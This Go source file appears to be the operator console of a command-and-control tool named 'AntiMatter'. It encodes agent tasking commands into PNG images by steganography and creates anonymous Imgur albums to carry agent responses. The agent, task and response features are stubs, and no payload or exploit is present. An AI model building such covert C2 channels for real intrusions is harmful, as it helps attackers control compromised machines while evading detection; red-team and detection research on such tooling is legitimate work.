package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"image/png"
	//"io/ioutil"
	//"mime/multipart"
	//"log"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"

	stego "github.com/auyer/steganography"
	"github.com/fatih/color"
	"github.com/manifoldco/promptui"
)

// Album is a type to handle the album creation
type Album struct {
	deleteHash string
	albumID    string
}

// validateOptions is a function that just helps check to make sure you're choosing a correct option
func validateOptions(slice []string, val string) bool {
	for _, item := range slice {
		if strings.EqualFold(item, val) {
			return true
		}
	}
	return false
}

// Global map for the Image module
var imageOptions = map[string]string{"Command": "", "Response": "", "BaseImage": "", "NewFilename": "", "ClientID": "", "AlbumID": ""}

// Global map for the Album module
var albumOptions = map[string]string{"Title": "", "Client-ID": ""}

// createImage is a function that uses the stego lib to encode an image you define and then write it to a new image
func createImage(command string, response string, origPic string, newPic string) {
	inFile, _ := os.Open(origPic)
	reader := bufio.NewReader(inFile)
	img, _ := png.Decode(reader)

	w := new(bytes.Buffer)
	err := stego.Encode(w, img, []byte(command))
	if err != nil {
		fmt.Printf("Error encoding file %v", err)
	} else {
		fmt.Println(color.GreenString("[+]"), "Success creating encoded image!")

	}

	outFile, _ := os.Create(newPic)
	w.WriteTo(outFile)
	outFile.Close()

}

// createAlbum queries the Imgur API in order to create an anonymous album, using a client ID
func createAlbum(title string, clientID string) (albumID, deleteHash interface{}) {

	apiURL := "https://api.imgur.com"
	resource := "/3/album/"
	data := url.Values{}
	data.Set("title", title)

	u, _ := url.ParseRequestURI(apiURL)
	u.Path = resource
	urlStr := u.String() // "https://api.com/user/"

	client := &http.Client{}
	r, _ := http.NewRequest("POST", urlStr, strings.NewReader(data.Encode())) // URL-encoded payload
	r.Header.Add("Authorization", "Client-ID "+clientID)
	r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	r.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))

	resp, _ := client.Do(r)
	var result map[string]interface{}

	json.NewDecoder(resp.Body).Decode(&result)

	nestedMap := result["data"]
	newMap, _ := nestedMap.(map[string]interface{})

	albumID = newMap["id"]
	deleteHash = newMap["deletehash"]

	fmt.Println(color.GreenString("\n[+]"), "Successfully created an album with the following values:")
	fmt.Println(color.GreenString("albumID:"), albumID, color.GreenString("deletehash:"), deleteHash, "\n")

	return albumID, deleteHash

}

// This is a mess, defines way too much. Defines everything needed for the promptui
// Defines different options to choose for an operator
// Handles the user defined varibles and stores them in a global map
func main() {
	for {
		options := []string{"Options", "Image", "Album", "Agent", "Task", "List", "Delete", "Response", "Exit", "Quit", "testHttp"}
		validate := func(input string) error {
			// _, err := strconv.ParseFloat(input, 64)
			found := validateOptions(options, input)

			if !found {
				return errors.New("Invalid Option")
			}

			return nil
		}

		// Each template displays the data received from the prompt with some formatting.
		templates := &promptui.PromptTemplates{
			Prompt:  "{{ . }} ",
			Valid:   "{{ . | green }} ",
			Invalid: "{{ . | red }} ",
			Success: "{{ . | cyan }} ",
		}

		prompt := promptui.Prompt{
			Label:     "AntiMatter >",
			Templates: templates,
			Validate:  validate,
		}

		result, err := prompt.Run()

		if err != nil {
			fmt.Printf("Prompt failed %v\n", err)
			return
		}

		//fmt.Printf("You chose %q\n", result)

		if strings.EqualFold(result, "options") {
			fmt.Println("")
			fmt.Println("Valid Commands		Description")
			fmt.Println("---------------         ------------") // Literally just aethetic
			fmt.Println("\n")
			fmt.Println(" Image		Create an Image for agent tasking")
			fmt.Println(" Album		Create an Album for agent responses")
			fmt.Println(" Agent		Create an Agent entity")
			fmt.Println(" Task		Create Tasking for agent")
			fmt.Println(" List		List images, albums, agents, and tasks")
			fmt.Println(" Delete		Delete images, albums, agents, and tasks")
			fmt.Println(" Response	Retrieve Responses from tasked agents")
			fmt.Println(" Exit/Quit	Exit program")
			fmt.Println("")
		}

		if strings.EqualFold(result, "exit") {
			os.Exit(0)
		}

		if strings.EqualFold(result, "Image") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/Image > ")
				color.Unset()
				text, _ := reader.ReadString('\n')

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println("\n---OPTIONS---")
					for key, value := range imageOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}
				} else if strings.Contains(text, "set") {
					if strings.Contains(text, "command") {
						command := strings.Split(text, "command ")
						imageOptions["Command"] = strings.Replace(strings.Join(command[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "response") {
						if strings.Contains(text, "s") {
							imageOptions["Response"] = "Short"
							imageOptions["ClientID"] = ""
							imageOptions["AlbumID"] = ""
						}
						if strings.Contains(text, "n") {
							imageOptions["Response"] = "No"
						}
						if strings.Contains(text, "l") {
							imageOptions["Response"] = "Long"
							imageOptions["AlbumID"] = ""
						}
					} else if strings.Contains(text, "base-image") {
						baseImage := strings.Split(text, "base-image ")
						imageOptions["BaseImage"] = strings.Replace(strings.Join(baseImage[1:], ""), "\n", "", -1)
					} else if strings.Contains(text, "new-filename") {
						newFilename := strings.Split(text, "new-filename ")
						imageOptions["NewFilename"] = strings.Replace(strings.Join(newFilename[1:], ""), "\n", "", -1)
					} else if strings.Contains(text, "client-id") {
						clientID := strings.Split(text, "client-id ")
						imageOptions["ClientId"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)
					} else if strings.Contains(text, "album-id") {
						albumID := strings.Split(text, "album-id ")
						imageOptions["AlbumId"] = strings.Replace(strings.Join(albumID[1:], ""), "\n", "", -1)
					}

				} else if strings.Contains(text, "go") {
					createImage(imageOptions["Command"], imageOptions["Response"], imageOptions["BaseImage"], imageOptions["NewFilename"])

				} else if strings.Contains(text, "exit") {
					break
				}

			}
		}
		if strings.EqualFold(result, "testHttp") {
			//albumID, deleteHash := createAlbum("test", "bc8c890066d6157")
			//fmt.Println(color.GreenString("[+]"), "Successfully created an album with the following values:")
			//fmt.Println(color.GreenString("albumID:"), albumID, color.GreenString("deletehash:"), deleteHash)

		}

		if strings.EqualFold(result, "Album") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/Album > ")
				color.Unset()
				// Had to do this since case sensitivity is dumb in golang
				initialText, _ := reader.ReadString('\n')
				text := strings.ToLower(initialText)

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println("\n---OPTIONS---")
					for key, value := range albumOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}
				} else if strings.Contains(text, "set") {
					if strings.Contains(text, "title") {
						title := strings.Split(text, "title ")
						albumOptions["Title"] = strings.Replace(strings.Join(title[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "client-id") {
						clientID := strings.Split(text, "client-id ")
						albumOptions["Client-ID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)
					}

				} else if strings.Contains(text, "go") {
					createAlbum(albumOptions["Title"], albumOptions["Client-ID"])

				} else if strings.Contains(text, "exit") {
					break
				}

			}

		}
		if strings.EqualFold(result, "") {
		}
		if strings.EqualFold(result, "") {
		}
		if strings.EqualFold(result, "") {
		}
		if strings.EqualFold(result, "") {
		}
	}
}
